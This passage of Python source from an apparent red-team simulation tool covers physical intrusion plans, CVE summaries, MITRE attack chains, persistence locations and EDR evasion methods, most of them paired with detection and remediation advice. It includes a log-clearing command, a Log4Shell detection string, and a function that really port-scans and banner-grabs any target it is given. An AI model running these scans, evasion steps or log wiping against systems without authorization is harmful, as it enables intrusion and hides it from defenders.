                    "duration_hours": 8,
                    "tasks": [
                        f"Map {facility} perimeter and all entry points",
                        "Identify security personnel schedules and patrol routes",
                        "Document camera placement, blind spots, and coverage gaps",
                        "Assess badge reader types and access control mechanisms",
                        "Identify visitor check-in procedures and badge issuance process",
                        "Map parking lot security and vehicle access controls",
                        "Document lighting conditions during day/night",
                        "Identify delivery schedules and vendor access patterns",
                        "Assess social media exposure of facility and employees",
                        "Map nearby public spaces for observation points",
                    ],
                    "tools": [
                        "Binoculars / telephoto lens",
                        "Camera with timestamp capability",
                        "GPS tracking device (for authorized testing)",
                        "Drone (if permitted and legal)",
                        "Social media monitoring tools",
                    ],
                },
                {
                    "phase": 2,
                    "name": "Entry Testing",
                    "duration_hours": 16,
                    "tasks": [
                        "Attempt tailgating at main entrance during peak hours",
                        "Test visitor badge issuance process with pretext scenarios",
                        "Assess loading dock security during delivery hours",
                        "Test emergency exit alarm response times",
                        "Evaluate parking garage access controls",
                        "Attempt badge cloning using Proxmark3",
                        "Test intercom/social engineering at restricted entrances",
                        "Assess after-hours security response",
                        "Test delivery person impersonation",
                        "Evaluate contractor/vendor access procedures",
                    ],
                    "tools": [
                        "RFID badge cloning equipment (HID Prox, iCLASS, MIFARE)",
                        "Lock pick set (for authorized testing only)",
                        "Camera detection equipment",
                        "Network port tester",
                        "Social engineering pretext materials",
                        "Fake uniforms and badges (for authorized testing)",
                        "USB drop devices (for authorized testing)",
                    ],
                },
                {
                    "phase": 3,
                    "name": "Internal Movement & Access Testing",
                    "duration_hours": 24,
                    "tasks": [
                        "Navigate to restricted areas without challenge",
                        "Identify unsecured workstations and unlocked screens",
                        "Locate sensitive document disposal areas (shredders, bins)",
                        "Test network port access in conference rooms and common areas",
                        "Assess clean desk policy compliance",
                        "Identify sensitive areas (server rooms, executive floors)",
                        "Test elevator access controls and floor restrictions",
                        "Assess meeting room security (whiteboards, projectors)",
                        "Test photocopier/scanner security (stored documents)",
                        "Identify physical security control gaps (unlocked cabinets, etc.)",
                    ],
                    "tools": [
                        "Network port tester",
                        "Raspberry Pi for network access testing",
                        "USB drop devices with beaconing",
                        "Camera (discreet)",
                        "Voice recorder (for authorized testing)",
                    ],
                },
                {
                    "phase": 4,
                    "name": "Egress & Data Exfiltration Testing",
                    "duration_hours": 8,
                    "tasks": [
                        "Document all successful entry/exit paths",
                        "Test ability to remove physical documents undetected",
                        "Test ability to remove electronic devices",
                        "Assess bag check procedures at exits",
                        "Test ability to photograph/record sensitive areas",
                        "Document security control gaps with evidence",
                    ],
                    "tools": [
                        "Camera with timestamp",
                        "Document bags (for authorized testing)",
                        "Electronic devices for exfiltration simulation",
                    ],
                },
                {
                    "phase": 5,
                    "name": "Reporting & Remediation",
                    "duration_hours": 16,
                    "tasks": [
                        "Compile all evidence of physical security weaknesses",
                        "Photograph security control gaps (if permitted)",
                        "Generate detailed findings report with risk ratings",
                        "Provide remediation recommendations with priorities",
                        "Present findings to security team and stakeholders",
                        "Develop improved physical security policies",
                        "Schedule follow-up assessment",
                    ],
                },
            ],
            "common_vulnerabilities": [
                {
                    "vulnerability": "Tailgating",
                    "risk": "HIGH",
                    "description": "Unauthorized individuals following authorized personnel through access-controlled doors",
                    "remediation": "Implement mantraps, security awareness training, and challenge protocols",
                },
                {
                    "vulnerability": "Unlocked Workstations",
                    "risk": "CRITICAL",
                    "description": "Workstations left unlocked and unattended",
                    "remediation": "Enforce screen lock policies (5-minute timeout), clean desk policy",
                },
                {
                    "vulnerability": "Weak Badge Security",
                    "risk": "HIGH",
                    "description": "Legacy HID Prox cards vulnerable to cloning",
                    "remediation": "Upgrade to MIFARE DESFire or mobile credentials with encryption",
                },
                {
                    "vulnerability": "Insufficient Surveillance",
                    "risk": "MEDIUM",
                    "description": "Blind spots in camera coverage",
                    "remediation": "Conduct camera coverage audit, add cameras to blind spots",
                },
                {
                    "vulnerability": "Social Engineering Susceptibility",
                    "risk": "HIGH",
                    "description": "Staff not challenging unknown individuals",
                    "remediation": "Regular security awareness training, challenge culture",
                },
            ],
            "tools": [
                "RFID badge cloning equipment (HID Prox, iCLASS, MIFARE, DESFire)",
                "Lock pick set (for authorized testing only)",
                "Camera detection equipment",
                "Network port tester",
                "Social engineering pretext materials",
                "Fake uniforms and badges (for authorized testing)",
                "USB drop devices with beaconing",
                "Proxmark3 for RFID analysis",
                "Raspberry Pi for network testing",
                "Drone for perimeter assessment (if legal)",
            ],
            "constraints": options.get("constraints", [
                "No property damage",
                "No interference with safety systems",
                "Immediate disclosure if safety is compromised",
                "Written authorization required from facility owner",
                "No disruption to business operations",
                "All testing during authorized time windows",
                "Immediate cessation if challenged by law enforcement",
            ]),
            "legal_considerations": [
                "Ensure written authorization covers all planned activities",
                "Verify local laws regarding physical security testing",
                "Coordinate with local law enforcement if required",
                "Maintain liability insurance for physical assessments",
                "Document all activities with timestamps for legal protection",
            ],
            "risk_level": "HIGH",
            "estimated_duration": "72 hours (over 2-3 weeks)",
            "created_at": datetime.utcnow().isoformat(),
        }

    # --------------------------------------------------------------------------
    # ENHANCED EXPLOIT SIMULATION
    # --------------------------------------------------------------------------
    def deploy_exploit(self, target: str, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Enhanced simulated exploit deployment with CVE database."""
        cve = payload.get("cve", "CVE-2021-44228")

        exploits = {
            "CVE-2021-44228": {
                "name": "Log4Shell",
                "cvss_score": 10.0,
                "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                "affected_products": ["Apache Log4j 2.0-beta9 to 2.14.1"],
                "exploit_complexity": "low",
                "privileges_required": "none",
                "user_interaction": "none",
                "scope": "changed",
                "mitigation": "Upgrade to Log4j 2.17.1+ or apply JNDI lookup removal",
                "detection_methods": [
                    "Monitor for JNDI lookup strings in logs (${jndi:ldap://})",
                    "Network traffic to unexpected LDAP/RMI/DNS servers",
                    "Process spawning from Java applications",
                ],
                "iocs": [
                    "DNS queries containing 'jndi'",
                    "Outbound LDAP connections from Java processes",
                    "Base64-encoded JNDI strings in HTTP headers",
                ],
            },
            "CVE-2023-38408": {
                "name": "OpenSSH Agent RCE",
                "cvss_score": 9.8,
                "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                "affected_products": ["OpenSSH 8.9p1 to 9.3p1"],
                "exploit_complexity": "low",
                "privileges_required": "none",
                "user_interaction": "none",
                "scope": "unchanged",
                "mitigation": "Upgrade to OpenSSH 9.3p2+",
                "detection_methods": [
                    "Monitor for unusual SSH agent forwarding",
                    "Anomalous SSH key usage patterns",
                ],
                "iocs": [
                    "SSH agent forwarding to untrusted hosts",
                    "Unexpected SSH key operations",
                ],
            },
            "CVE-2023-46604": {
                "name": "Apache ActiveMQ RCE",
                "cvss_score": 10.0,
                "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                "affected_products": ["Apache ActiveMQ 5.18.0 before 5.18.3", "Apache ActiveMQ 5.17.0 before 5.17.6"],
                "exploit_complexity": "low",
                "privileges_required": "none",
                "user_interaction": "none",
                "scope": "unchanged",
                "mitigation": "Upgrade to Apache ActiveMQ 5.18.3+ or 5.17.6+",
                "detection_methods": [
                    "Monitor for serialized Java objects in ActiveMQ messages",
                    "Unexpected class loading in Java processes",
                ],
                "iocs": [
                    "Serialized Java objects in network traffic",
                    "Class instantiation from unexpected sources",
                ],
            },
            "CVE-2023-29357": {
                "name": "SharePoint Server Elevation of Privilege",
                "cvss_score": 9.8,
                "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                "affected_products": ["Microsoft SharePoint Server 2019", "SharePoint Server Subscription Edition"],
                "exploit_complexity": "low",
                "privileges_required": "none",
                "user_interaction": "none",
                "scope": "unchanged",
                "mitigation": "Apply Microsoft security updates",
                "detection_methods": [
                    "Monitor for unauthorized SharePoint API access",
                    "Anomalous SharePoint admin activity",
                ],
                "iocs": [
                    "Unauthorized SharePoint API calls",
                    "Privilege escalation in SharePoint logs",
                ],
            },
            "CVE-2024-21762": {
                "name": "Fortinet FortiOS SSL VPN Heap Overflow",
                "cvss_score": 9.6,
                "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                "affected_products": ["FortiOS 7.4.0 through 7.4.2", "FortiOS 7.2.0 through 7.2.6"],
                "exploit_complexity": "low",
                "privileges_required": "none",
                "user_interaction": "none",
                "scope": "unchanged",
                "mitigation": "Upgrade to FortiOS 7.4.3+ or 7.2.7+",
                "detection_methods": [
                    "Monitor for SSL VPN exploitation attempts",
                    "Unexpected VPN session behavior",
                ],
                "iocs": [
                    "Anomalous SSL VPN traffic patterns",
                    "VPN session anomalies",
                ],
            },
        }

        exploit_info = exploits.get(cve, {
            "name": "Unknown CVE",
            "cvss_score": "Unknown",
            "cvss_vector": "Unknown",
            "affected_products": ["Unknown"],
            "exploit_complexity": "unknown",
            "privileges_required": "unknown",
            "user_interaction": "unknown",
            "scope": "unknown",
            "mitigation": "Research and apply vendor patches",
            "detection_methods": ["Monitor for anomalous behavior related to affected products"],
            "iocs": ["Unknown - research required"],
        })

        return {
            "target": target,
            "cve": cve,
            "exploit_info": exploit_info,
            "simulation_only": True,
            "warning": "EXPLOITATION IS FOR AUTHORIZED TESTING ONLY",
            "recommendations": [
                "Patch affected systems immediately",
                "Implement WAF rules for known exploit patterns",
                "Monitor for indicators of compromise",
                "Implement network segmentation to limit blast radius",
                "Deploy EDR with behavioral detection",
                "Conduct threat hunting for exploitation attempts",
            ],
            "detection_rules": self._generate_exploit_detection_rules(cve, exploit_info),
            "created_at": datetime.utcnow().isoformat(),
        }


    # --------------------------------------------------------------------------
    # ENHANCED SIMULATION METHODS (V3 Style)
    # --------------------------------------------------------------------------
    def simulate_attack_chain(self, target: str, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Simulate a full attack chain with MITRE mapping and detection likelihood."""
        chain_type = payload.get("chain_type", "apt_style")

        attack_chains = {
            "apt_style": [
                {"tactic": "Initial Access", "technique": "T1566.001", "name": "Spearphishing Attachment", "phase": ChainPhase.DELIVERY},
                {"tactic": "Execution", "technique": "T1204.002", "name": "Malicious File", "phase": ChainPhase.EXPLOITATION},
                {"tactic": "Persistence", "technique": "T1547.001", "name": "Registry Run Keys", "phase": ChainPhase.INSTALLATION},
                {"tactic": "Defense Evasion", "technique": "T1027", "name": "Obfuscated Files", "phase": ChainPhase.INSTALLATION},
                {"tactic": "Credential Access", "technique": "T1003.001", "name": "LSASS Memory Dump", "phase": ChainPhase.ACTIONS_ON_OBJECTIVES},
                {"tactic": "Discovery", "technique": "T1083", "name": "File and Directory Discovery", "phase": ChainPhase.ACTIONS_ON_OBJECTIVES},
                {"tactic": "Lateral Movement", "technique": "T1021.002", "name": "SMB/Admin Shares", "phase": ChainPhase.ACTIONS_ON_OBJECTIVES},
                {"tactic": "Collection", "technique": "T1005", "name": "Data from Local System", "phase": ChainPhase.COLLECTION},
                {"tactic": "Exfiltration", "technique": "T1041", "name": "Exfil Over C2", "phase": ChainPhase.EXFILTRATION},
                {"tactic": "Impact", "technique": "T1490", "name": "Inhibit System Recovery", "phase": ChainPhase.IMPACT},
            ],
            "ransomware": [
                {"tactic": "Initial Access", "technique": "T1190", "name": "Exploit Public App", "phase": ChainPhase.INITIAL_ACCESS},
                {"tactic": "Execution", "technique": "T1059.003", "name": "Windows Command Shell", "phase": ChainPhase.EXPLOITATION},
                {"tactic": "Persistence", "technique": "T1543.003", "name": "Windows Service", "phase": ChainPhase.INSTALLATION},
                {"tactic": "Defense Evasion", "technique": "T1486", "name": "Data Encrypted for Impact", "phase": ChainPhase.IMPACT},
                {"tactic": "Impact", "technique": "T1490", "name": "Inhibit System Recovery", "phase": ChainPhase.IMPACT},
            ],
            "supply_chain": [
                {"tactic": "Initial Access", "technique": "T1195.001", "name": "Supply Chain Compromise", "phase": ChainPhase.INITIAL_ACCESS},
                {"tactic": "Execution", "technique": "T1059", "name": "Command and Scripting Interpreter", "phase": ChainPhase.EXPLOITATION},
                {"tactic": "Persistence", "technique": "T1547.001", "name": "Registry Run Keys", "phase": ChainPhase.INSTALLATION},
                {"tactic": "Defense Evasion", "technique": "T1027", "name": "Obfuscated Files", "phase": ChainPhase.INSTALLATION},
                {"tactic": "Command and Control", "technique": "T1071.001", "name": "Web Protocols", "phase": ChainPhase.C2},
                {"tactic": "Exfiltration", "technique": "T1567.002", "name": "Exfiltration to Cloud Storage", "phase": ChainPhase.EXFILTRATION},
            ],
            "insider_threat": [
                {"tactic": "Initial Access", "technique": "T1078", "name": "Valid Accounts", "phase": ChainPhase.INITIAL_ACCESS},
                {"tactic": "Collection", "technique": "T1005", "name": "Data from Local System", "phase": ChainPhase.COLLECTION},
                {"tactic": "Collection", "technique": "T1039", "name": "Data from Network Shared Drive", "phase": ChainPhase.COLLECTION},
                {"tactic": "Exfiltration", "technique": "T1048", "name": "Exfiltration Over Alternative Protocol", "phase": ChainPhase.EXFILTRATION},
            ],
            "advanced_persistent_threat": [
                {"tactic": "Initial Access", "technique": "T1566.002", "name": "Spearphishing Link", "phase": ChainPhase.INITIAL_ACCESS},
                {"tactic": "Execution", "technique": "T1204.001", "name": "Malicious Link", "phase": ChainPhase.EXPLOITATION},
                {"tactic": "Persistence", "technique": "T1546.003", "name": "WMI Event Subscription", "phase": ChainPhase.INSTALLATION},
                {"tactic": "Privilege Escalation", "technique": "T1055", "name": "Process Injection", "phase": ChainPhase.INSTALLATION},
                {"tactic": "Defense Evasion", "technique": "T1562.001", "name": "Disable or Modify Tools", "phase": ChainPhase.INSTALLATION},
                {"tactic": "Credential Access", "technique": "T1003.001", "name": "LSASS Memory", "phase": ChainPhase.ACTIONS_ON_OBJECTIVES},
                {"tactic": "Discovery", "technique": "T1018", "name": "Remote System Discovery", "phase": ChainPhase.ACTIONS_ON_OBJECTIVES},
                {"tactic": "Lateral Movement", "technique": "T1021.001", "name": "Remote Desktop Protocol", "phase": ChainPhase.ACTIONS_ON_OBJECTIVES},
                {"tactic": "Collection", "technique": "T1213.002", "name": "SharePoint", "phase": ChainPhase.COLLECTION},
                {"tactic": "Exfiltration", "technique": "T1041", "name": "Exfil Over C2", "phase": ChainPhase.EXFILTRATION},
                {"tactic": "Impact", "technique": "T1491.001", "name": "Defacement: Internal Websites", "phase": ChainPhase.IMPACT},
            ],
        }

        chain = attack_chains.get(chain_type, attack_chains["apt_style"])
        timeline = []
        current_time = datetime.now()
        total_detection_likelihood = []

        for step in chain:
            step_time = current_time + timedelta(minutes=random.randint(5, 120))
            detection = random.choice(["low", "medium", "high"])
            total_detection_likelihood.append(detection)

            timeline.append({
                **step,
                "timestamp": step_time.strftime("%Y-%m-%d %H:%M:%S"),
                "status": "simulated",
                "detection_likelihood": detection,
                "mitre_url": f"https://attack.mitre.org/techniques/{step['technique']}/",
                "data_sources": self._get_data_sources_for_technique(step["technique"]),
                "detection_strategies": self._get_detection_strategies(step["technique"]),
            })
            current_time = step_time

        # Calculate overall detection difficulty
        detection_counts = {"low": 0, "medium": 0, "high": 0}
        for d in total_detection_likelihood:
            detection_counts[d] += 1

        overall_detection = "low" if detection_counts["low"] > detection_counts["medium"] and detection_counts["low"] > detection_counts["high"] else \
                           "high" if detection_counts["high"] > detection_counts["low"] and detection_counts["high"] > detection_counts["medium"] else "medium"

        return {
            "target": target,
            "chain_type": chain_type,
            "total_steps": len(timeline),
            "timeline": timeline,
            "mitre_attack_coverage": len(set(step["technique"] for step in timeline)),
            "tactics_covered": list(set(step["tactic"] for step in timeline)),
            "estimated_duration": f"{len(timeline) * 45} minutes",
            "overall_detection_likelihood": overall_detection,
            "recommendations": self._get_mitre_recommendations(),
            "sigma_rules": self._generate_sigma_rules_for_chain(chain),
            "yara_rules": self._generate_yara_rules_for_chain(chain),
            "created_at": datetime.utcnow().isoformat(),
        }

    def deploy_persistence(self, target: str, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Detailed persistence mechanism enumeration with detection strategies."""
        mechanisms = [
            {
                "name": "Registry Run Keys",
                "location": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "detection": "Monitor registry modifications (Event ID 4657)",
                "mitigation": "Use AppLocker/WDAC, registry monitoring",
                "difficulty": "low",
                "prevalence": "high",
            },
            {
                "name": "Scheduled Task",
                "location": "Task Scheduler / cron",
                "detection": "Monitor new scheduled tasks (Event ID 4698)",
                "mitigation": "Restrict task creation, monitor task changes",
                "difficulty": "low",
                "prevalence": "high",
            },
            {
                "name": "WMI Event Subscription",
                "location": "root\\subscription namespace",
                "detection": "Monitor WMI event subscriptions (Event ID 19-21)",
                "mitigation": "Enable WMI logging, monitor with Sysmon",
                "difficulty": "high",
                "prevalence": "medium",
            },
            {
                "name": "Startup Folder",
                "location": "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
                "detection": "Monitor startup folder changes",
                "mitigation": "Folder redirection + AppLocker",
                "difficulty": "low",
                "prevalence": "medium",
            },
            {
                "name": "Service Creation",
                "location": "Windows Services / systemd",
                "detection": "Event ID 7045 (new service installed)",
                "mitigation": "Restrict service creation, monitor with EDR",
                "difficulty": "medium",
                "prevalence": "high",
            },
            {
                "name": "Cron Job (Linux)",
                "location": "/etc/crontab, /var/spool/cron",
                "detection": "Monitor cron file modifications",
                "mitigation": "Immutable cron files, file integrity monitoring",
                "difficulty": "low",
                "prevalence": "high",
            },
            {
                "name": "Systemd Service (Linux)",
                "location": "/etc/systemd/system/",
                "detection": "Monitor unit file changes",
                "mitigation": "Restrict write access, audit unit files",
                "difficulty": "medium",
                "prevalence": "medium",
            },
            {
                "name": "SSH Authorized Keys",
                "location": "~/.ssh/authorized_keys",
                "detection": "Monitor authorized_keys changes",
                "mitigation": "Use SSH certificates, monitor file changes",
                "difficulty": "low",
                "prevalence": "medium",
            },
            {
                "name": "DLL Search Order Hijacking",
                "location": "Application directories, PATH",
                "detection": "Monitor DLL loads from unexpected locations",
                "mitigation": "Safe DLL search mode, application control",
                "difficulty": "high",
                "prevalence": "medium",
            },
            {
                "name": "Application Shimming",
                "location": "SDB database",
                "detection": "Monitor shim database installations",
                "mitigation": "Disable shim installation, application control",
                "difficulty": "high",
                "prevalence": "low",
            },
            {
                "name": "Netsh Helper DLL",
                "location": "HKLM\\SOFTWARE\\Microsoft\\NetSh",
                "detection": "Monitor netsh helper DLL registrations",
                "mitigation": "Restrict registry modifications",
                "difficulty": "medium",
                "prevalence": "low",
            },
            {
                "name": "Office Application Startup",
                "location": "Word/Excel startup folders, add-ins",
                "detection": "Monitor Office startup folder changes",
                "mitigation": "Disable macros, application control",
                "difficulty": "medium",
                "prevalence": "medium",
            },
        ]

        return {
            "target": target,
            "persistence_mechanisms": mechanisms,
            "total_mechanisms": len(mechanisms),
            "high_prevalence": [m for m in mechanisms if m["prevalence"] == "high"],
            "high_difficulty": [m for m in mechanisms if m["difficulty"] == "high"],
            "recommendations": self._get_persistence_recommendations(),
            "persistence_hunt_queries": self._generate_persistence_hunt_queries(),
            "sigma_rules": self._generate_persistence_sigma_rules(),
            "created_at": datetime.utcnow().isoformat(),
        }

    def simulate_evasion_technique(self, evasion_type: str, target: str, 
                                   options: Optional[Dict] = None) -> Dict[str, Any]:
        """Simulate various evasion techniques with detection guidance."""
        options = options or {}

        evasion_techniques = {
            "amsi_bypass": {
                "name": "AMSI Bypass",
                "description": "Bypass Windows Antimalware Scan Interface",
                "methods": [
                    "Patch amsiInitFailed flag in memory",
                    "Hook AMSIScanBuffer to return clean",
                    "Use reflective DLL injection to unload AMSI",
                ],
                "detection": [
                    "Monitor for AMSI DLL unloads in PowerShell",
                    "Detect memory modifications to AMSI modules",
                    "Alert on suspicious .NET reflection patterns",
                ],
                "mitigation": [
                    "Enable PowerShell Constrained Language Mode",
                    "Deploy Application Control (WDAC)",
                    "Use AMSI-aware EDR solutions",
                ],
                "difficulty": "medium",
            },
            "etw_patching": {
                "name": "ETW Patching",
                "description": "Disable Event Tracing for Windows",
                "methods": [
                    "Patch ETW registration functions in ntdll.dll",
                    "Modify ETW provider enablement flags",
                    "Use hardware breakpoints to intercept ETW calls",
                ],
                "detection": [
                    "Monitor for ntdll.dll modifications",
                    "Detect ETW provider state changes",
                    "Alert on suspicious memory protections",
                ],
                "mitigation": [
                    "Enable kernel-level ETW monitoring",
                    "Use hypervisor-protected code integrity (HVCI)",
                    "Deploy EDR with kernel callbacks",
                ],
                "difficulty": "high",
            },
            "log_clearing": {
                "name": "Log Clearing",
                "description": "Clear or modify event logs to hide activity",
                "methods": [
                    "wevtutil cl System/Security",
                    "Clear-EventLog PowerShell cmdlet",
                    "Direct event log file manipulation",
                ],
                "detection": [
                    "Monitor for Event ID 1102 (log cleared)",
                    "Alert on wevtutil usage",
                    "Detect PowerShell Clear-EventLog calls",
                ],
                "mitigation": [
                    "Forward logs to SIEM in real-time",
                    "Restrict log clearing permissions",
                    "Implement WORM storage for critical logs",
                ],
                "difficulty": "low",
            },
            "timestomping": {
                "name": "Timestomping",
                "description": "Modify file timestamps to hide activity",
                "methods": [
                    "touch -t command on Linux",
                    "PowerShell Set-ItemProperty for timestamps",
                    "Direct NTFS MFT manipulation",
                ],
                "detection": [
                    "Monitor for timestamp modifications",
                    "Compare file timestamps with MFT records",
                    "Alert on suspicious time changes",
                ],
                "mitigation": [
                    "Enable file integrity monitoring (FIM)",
                    "Use immutable file systems where possible",
                    "Monitor with EDR for timestamp APIs",
                ],
                "difficulty": "medium",
            },
            "process_hollowing": {
                "name": "Process Hollowing",
                "description": "Replace legitimate process memory with malicious code",
                "methods": [
                    "Create suspended process, unmap memory, write shellcode, resume",
                    "Use NtUnmapViewOfSection and NtWriteVirtualMemory",
                ],
                "detection": [
                    "Monitor for unmap + write + resume patterns",
                    "Detect hollowed processes with memory analysis",
                    "Alert on suspicious parent-child process relationships",
                ],
                "mitigation": [
                    "Enable Microsoft Defender Attack Surface Reduction",
                    "Use Control Flow Guard (CFG)",
                    "Deploy EDR with memory protection",
                ],
                "difficulty": "high",
            },
            "api_unhooking": {
                "name": "API Unhooking",
                "description": "Remove EDR hooks from system APIs",
                "methods": [
                    "Reload ntdll.dll from disk to remove hooks",
                    "Use direct syscalls to bypass hooks",
                    "Patch hooked functions to restore original bytes",
                ],
                "detection": [
                    "Monitor for ntdll.dll reloads",
                    "Detect direct syscall usage",
                    "Alert on memory protection changes",
                ],
                "mitigation": [
                    "Use kernel-level EDR hooks",
                    "Deploy hypervisor-based monitoring",
                    "Implement ETW-based detection",
                ],
                "difficulty": "high",
            },
            "parent_pid_spoofing": {
                "name": "Parent PID Spoofing",
                "description": "Spawn processes with fake parent process IDs",
                "methods": [
                    "Use UpdateProcThreadAttribute with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS",
                    "Manipulate PEB to fake parent process",
                ],
                "detection": [
                    "Monitor for parent-child process anomalies",
                    "Detect processes with unexpected parents",
                    "Alert on UpdateProcThreadAttribute usage",
                ],
                "mitigation": [
                    "Enable Windows Defender Attack Surface Reduction",
                    "Use process creation monitoring",
                    "Deploy EDR with behavioral analytics",
                ],
                "difficulty": "medium",
            },
        }

        technique = evasion_techniques.get(evasion_type, {
            "name": "Unknown Evasion",
            "description": "Evasion technique not in database",
            "methods": ["Unknown"],
            "detection": ["Monitor for anomalous behavior"],
            "mitigation": ["Deploy comprehensive EDR"],
            "difficulty": "unknown",
        })

        return {
            "target": target,
            "evasion_type": evasion_type,
            "technique": technique,
            "simulation_only": True,
            "warning": "EVASION TECHNIQUES ARE FOR AUTHORIZED TESTING ONLY",
            "detection_rules": self._generate_evasion_detection_rules(evasion_type),
            "created_at": datetime.utcnow().isoformat(),
        }


    # --------------------------------------------------------------------------
    # ENHANCED FULL RED TEAM ASSESSMENT
    # --------------------------------------------------------------------------
    def full_red_team_assessment(self, target: str, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Orchestrate a complete red-team assessment with comprehensive reporting."""
        self._logger.info(f"[CRIMSON] Starting full red team assessment on {target}")

        # Execute all phases
        attack_chain_result = self.simulate_attack_chain(target, payload)
        lateral_result = self.simulate_lateral_movement(target, payload)
        persistence_result = self.deploy_persistence(target, payload)
        exfil_result = self.simulate_exfiltration(target, payload)
        social_result = self.generate_social_engineering_campaign(target, "phishing", payload)
        physical_result = self.plan_physical_security_assessment(target, payload)
        exploit_result = self.deploy_exploit(target, payload)

        # Calculate overall risk score
        risk_scores = []
        if isinstance(attack_chain_result, dict) and "timeline" in attack_chain_result:
            high_risk_steps = sum(1 for step in attack_chain_result["timeline"] 
                                if step.get("detection_likelihood") == "low")
            risk_scores.append(high_risk_steps * 10)

        overall_risk = min(sum(risk_scores) if risk_scores else 50, 100)

        # Generate executive summary
        executive_summary = self._generate_executive_summary_full(
            target, overall_risk, attack_chain_result, lateral_result, 
            persistence_result, exfil_result, social_result
        )

        return {
            "target": target,
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "assessment_type": "Full Red Team",
            "session_id": self._session_id,
            "overall_risk_score": overall_risk,
            "risk_level": "CRITICAL" if overall_risk >= 80 else "HIGH" if overall_risk >= 60 else "MEDIUM" if overall_risk >= 40 else "LOW",
            "phases": {
                "attack_chain": attack_chain_result,
                "lateral_movement": lateral_result,
                "persistence": persistence_result,
                "exfiltration": exfil_result,
                "social_engineering": social_result,
                "physical_security": physical_result,
                "exploit_analysis": exploit_result,
            },
            "executive_summary": executive_summary,
            "key_findings": self._extract_key_findings(
                attack_chain_result, lateral_result, persistence_result, 
                exfil_result, social_result
            ),
            "iocs_generated": [asdict(i) for i in self._iocs[-30:]],
            "artifacts_collected": [asdict(a) for a in self._artifacts[-15:]],
            "mitre_attack_coverage": self._calculate_mitre_coverage(),
            "next_steps": [
                "Review findings with blue team and stakeholders",
                "Prioritize remediation based on risk score and business impact",
                "Implement detection rules for identified TTPs",
                "Schedule purple team exercise to validate defenses",
                "Update incident response playbooks with new scenarios",
                "Conduct security awareness training based on social engineering results",
                "Implement technical controls for highest-risk findings",
                "Schedule follow-up assessment in 6 months",
            ],
            "compliance_mapping": {
                "NIST_800_53": ["SI-4", "AU-6", "IR-4", "CA-7"],
                "ISO_27001": ["A.12.4", "A.16.1", "A.18.2"],
                "CIS_Controls": ["CSC 8", "CSC 12", "CSC 16", "CSC 19"],
                "MITRE_ATT&CK": "Full framework coverage assessment",
            },
        }

    # --------------------------------------------------------------------------
    # RECONNAISSANCE METHODS
    # --------------------------------------------------------------------------
    def _perform_network_recon(self, target: str, payload: Dict) -> Dict[str, Any]:
        """REAL network reconnaissance — PURE PYTHON (socket + urllib), no
        external binaries needed, works on serverless. Every result below
        comes from an actual network operation."""
        import socket as _socket

        host = (target or "").replace("https://", "").replace("http://", "").split("/")[0].split(":")[0]
        results = {
            "target": target,
            "host": host,
            "recon_type": "network",
            "mode": "real",
            "timestamp": datetime.utcnow().isoformat(),
            "findings": {},
            "notes": [],
        }
        if not host:
            results["error"] = "No target provided — give a domain, URL or IP."
            return results

        # 1. DNS resolution (real)
        try:
            infos = _socket.getaddrinfo(host, None)
            ips = sorted({i[4][0] for i in infos})
            results["findings"]["dns"] = {"resolved_ips": ips}
        except Exception as e:
            results["findings"]["dns"] = {"error": f"resolution failed: {e}"}
            results["notes"].append("DNS resolution failed — host may not exist.")

        # 2. TCP port scan (real socket connects, common service set)
        ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 1433,
                 3306, 3389, 5432, 5900, 6379, 8080, 8443]
        open_ports = []
        banners = {}
        for port in ports:
            try:
                with _socket.create_connection((host, port), timeout=1.5):
                    open_ports.append(port)
                    # Banner grab (real)
                    try:
                        with _socket.create_connection((host, port), timeout=1.5) as s:
                            s.settimeout(2)
                            try:
                                banner = s.recv(128).decode("utf-8", errors="replace").strip()
                                if banner:
                                    banners[str(port)] = banner[:80]
                            except Exception:
                                pass
                    except Exception:
                        pass
            except Exception:
                pass
        results["findings"]["port_scan"] = {
            "scanned_ports": len(ports), "open_ports": open_ports, "banners": banners,
        }

        # 3. HTTP probe (real request + headers)
        for scheme in ("https", "http"):
            try:
                req = urllib.request.Request(
                    f"{scheme}://{host}/", headers={"User-Agent": "IRIS-RedTeam-Recon/1.0"})
                with urllib.request.urlopen(req, timeout=10) as resp:
                    results["findings"]["http"] = {
                        "scheme": scheme, "status": resp.status,
                        "server": resp.headers.get("Server", ""),
                        "powered_by": resp.headers.get("X-Powered-By", ""),
                        "title": (resp.read(4096).decode("utf-8", errors="ignore")[:200]),
                    }
                    break
            except urllib.error.HTTPError as e:
                results["findings"]["http"] = {"scheme": scheme, "status": e.code,
                                                 "note": "HTTP error (service IS responding)"}
                break
            except Exception:
                continue

        results["recommendations"] = [
            "Close unnecessary open ports found above",
            "Hide service version banners",
            "Place services behind a firewall / WAF",
        ]
        return results

    def _perform_host_recon(self, target: str, payload: Dict) -> Dict[str, Any]:
        """Perform host-level reconnaissance."""
        return self._ttp_discovery(self._detect_platform(), target, 
                                   {"discovery_type": payload.get("discovery_type", "system")})

    def _simulate_reconnaissance(self, target: str, payload: Dict) -> Dict[str, Any]:
        """PLANNING-ONLY reconnaissance outline. IRIS does NOT fabricate scan
        results — this returns an assessment plan and prompts for a real run.
        (Kept for API compatibility; the real path is _perform_network_recon.)"""
        recon_type = payload.get("recon_type", "network")
        return {
            "target": target,
            "recon_type": recon_type,
            "mode": "planning-only",
            "note": ("This was a PLANNING request, so no live probes were fired. To get REAL "
                     "reconnaissance results (DNS, port scan, banners, HTTP probe), ask for a "
                     "live scan of the target — IRIS performs actual network operations."),
            "assessment_plan": [
